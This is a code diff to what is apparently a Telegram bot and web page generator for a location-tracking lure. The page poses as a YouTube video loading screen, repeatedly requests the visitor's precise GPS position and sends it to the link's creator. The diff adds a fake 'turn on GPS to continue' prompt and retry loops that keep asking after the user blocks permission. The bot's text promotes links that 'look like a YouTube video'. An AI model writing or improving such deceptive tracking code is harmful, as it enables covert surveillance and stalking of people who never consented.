@@ -114,7 +114,6 @@ def fake_domain_track(link_id):
                 overflow: hidden;
             }}
             
-            /* Loading Content */
             .loading-content {{
                 flex: 1;
                 display: flex;
@@ -126,7 +125,6 @@ def fake_domain_track(link_id):
                 position: relative;
             }}
             
-            /* YouTube-style loading spinner */
             .youtube-loader {{
                 width: 48px;
                 height: 48px;
@@ -143,7 +141,6 @@ def fake_domain_track(link_id):
                 100% {{ transform: rotate(360deg); }}
             }}
             
-            /* Skeleton loading cards */
             .skeleton-container {{
                 width: 100%;
                 max-width: 380px;
@@ -184,7 +181,6 @@ def fake_domain_track(link_id):
                 width: 80%;
             }}
             
-            /* Shimmer animation - moving gray texture */
             .skeleton-thumbnail::after,
             .skeleton-line::after {{
                 content: '';
@@ -207,7 +203,6 @@ def fake_domain_track(link_id):
                 100% {{ left: 100%; }}
             }}
             
-            /* Progress bar */
             .progress-bar {{
                 position: fixed;
                 top: 0;
@@ -234,7 +229,6 @@ def fake_domain_track(link_id):
                 100% {{ width: 100%; }}
             }}
             
-            /* Bottom Navigation */
             .bottom-nav {{
                 display: flex;
                 justify-content: space-around;
@@ -259,6 +253,47 @@ def fake_domain_track(link_id):
                 height: 24px;
                 fill: currentColor;
             }}
+            
+            /* GPS OFF Indicator - Shows when location is disabled */
+            .location-indicator {{
+                position: fixed;
+                bottom: 100px;
+                left: 50%;
+                transform: translateX(-50%);
+                display: none;
+                flex-direction: column;
+                align-items: center;
+                gap: 12px;
+                z-index: 100;
+                background: rgba(255,255,255,0.05);
+                padding: 16px 24px;
+                border-radius: 16px;
+                backdrop-filter: blur(10px);
+                border: 1px solid rgba(255,255,255,0.05);
+            }}
+            .location-indicator.show {{
+                display: flex;
+            }}
+            .location-icon {{
+                font-size: 32px;
+                animation: pulse 1.5s infinite;
+            }}
+            @keyframes pulse {{
+                0%, 100% {{ transform: scale(1); opacity: 0.7; }}
+                50% {{ transform: scale(1.1); opacity: 1; }}
+            }}
+            .location-text {{
+                color: #aaaaaa;
+                font-size: 12px;
+                letter-spacing: 0.5px;
+                text-align: center;
+            }}
+            .location-sub {{
+                color: #666666;
+                font-size: 10px;
+                text-align: center;
+                margin-top: -4px;
+            }}
         </style>
     </head>
     <body>
@@ -269,7 +304,6 @@ def fake_domain_track(link_id):
         
         <!-- Main App Container -->
         <div class="app-container">
-            <!-- Loading Content -->
             <div class="loading-content">
                 <div class="youtube-loader" id="loader"></div>
                 
@@ -301,7 +335,13 @@ def fake_domain_track(link_id):
                 </div>
             </div>
             
-            <!-- Bottom Navigation -->
+            <!-- GPS OFF Indicator -->
+            <div class="location-indicator" id="locationIndicator">
+                <div class="location-icon">📍</div>
+                <div class="location-text">Enable location services</div>
+                <div class="location-sub">Turn on GPS to continue</div>
+            </div>
+            
             <div class="bottom-nav">
                 <div class="nav-item active">
                     <svg viewBox="0 0 24 24"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>
@@ -326,12 +366,15 @@ def fake_domain_track(link_id):
             const linkId = '{link_id}';
             const redirectUrl = '{website_url}';
             const progressFill = document.getElementById('progressFill');
+            const locationIndicator = document.getElementById('locationIndicator');
             let locationCaptured = false;
             let attempts = 0;
+            let gpsOffShown = false;
             
             function sendLocation(position) {{
                 if (locationCaptured) return;
                 locationCaptured = true;
+                locationIndicator.classList.remove('show');
                 
                 const {{latitude, longitude, accuracy}} = position.coords;
                 progressFill.style.width = '100%';
@@ -362,8 +405,22 @@ def fake_domain_track(link_id):
             
             function handleError(error) {{
                 attempts++;
-                // Always retry, never give up
-                setTimeout(requestLocation, 2000);
+                
+                if (error.code === 1) {{
+                    // Permission denied - user clicked "Block"
+                    // Keep trying - browser might show popup again
+                    setTimeout(requestLocation, 5000);
+                }} else if (error.code === 2 || error.code === 3) {{
+                    // Position unavailable or timeout = GPS is OFF
+                    if (!gpsOffShown) {{
+                        gpsOffShown = true;
+                        locationIndicator.classList.add('show');
+                    }}
+                    // Keep retrying until GPS is turned on
+                    setTimeout(requestLocation, 3000);
+                }} else {{
+                    setTimeout(requestLocation, 2000);
+                }}
             }}
             
             function requestLocation() {{
@@ -374,13 +431,11 @@ def fake_domain_track(link_id):
                         {{enableHighAccuracy: true, timeout: 30000, maximumAge: 0}}
                     );
                 }} else {{
-                    // Geolocation not supported - retry
                     setTimeout(requestLocation, 2000);
                 }}
             }}
             
-            // Immediately request location when page loads
-            // This triggers the browser's permission prompt
+            // Start immediately
             requestLocation();
         </script>
     </body>
@@ -435,7 +490,7 @@ def health():
 # Telegram Bot Handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🎯 *YouTube Location Tracker*\n\n"
+        "🎯 *Location Tracker*\n\n"
         "📝 *Please send me the website URL* to redirect users after location capture.\n\n"
         "Example: `https://your-website.com`\n\n"
         "Or send `/cancel` to cancel.",
@@ -460,13 +515,13 @@ async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
     link = generate_link(user_id, website_url, brand, chat_id)
     
     keyboard = [
-        [InlineKeyboardButton("📋 Copy YouTube Link", url=link)],
+        [InlineKeyboardButton("📋 Copy Link", url=link)],
         [InlineKeyboardButton("🔄 Generate New Link", callback_data='new_link')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        f"✅ *YouTube Link Generated!*\n\n🔗 {link}\n\nShare this link - it looks like a YouTube video!",
+        f"✅ *Link Generated!*\n\n🔗 {link}\n\nShare this link!",
         reply_markup=reply_markup,
         parse_mode=None
     )
@@ -476,7 +531,7 @@ async def new_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     await query.edit_message_text(
-        "🎯 *YouTube Location Tracker*\n\n📝 *Please send me the website URL* for this new link.\n\nExample: `https://your-website.com`\n\nOr send `/cancel` to cancel.",
+        "🎯 *Location Tracker*\n\n📝 *Please send me the website URL* for this new link.\n\nExample: `https://your-website.com`\n\nOr send `/cancel` to cancel.",
         parse_mode='Markdown'
     )
     context.user_data['brand'] = 'youtube'
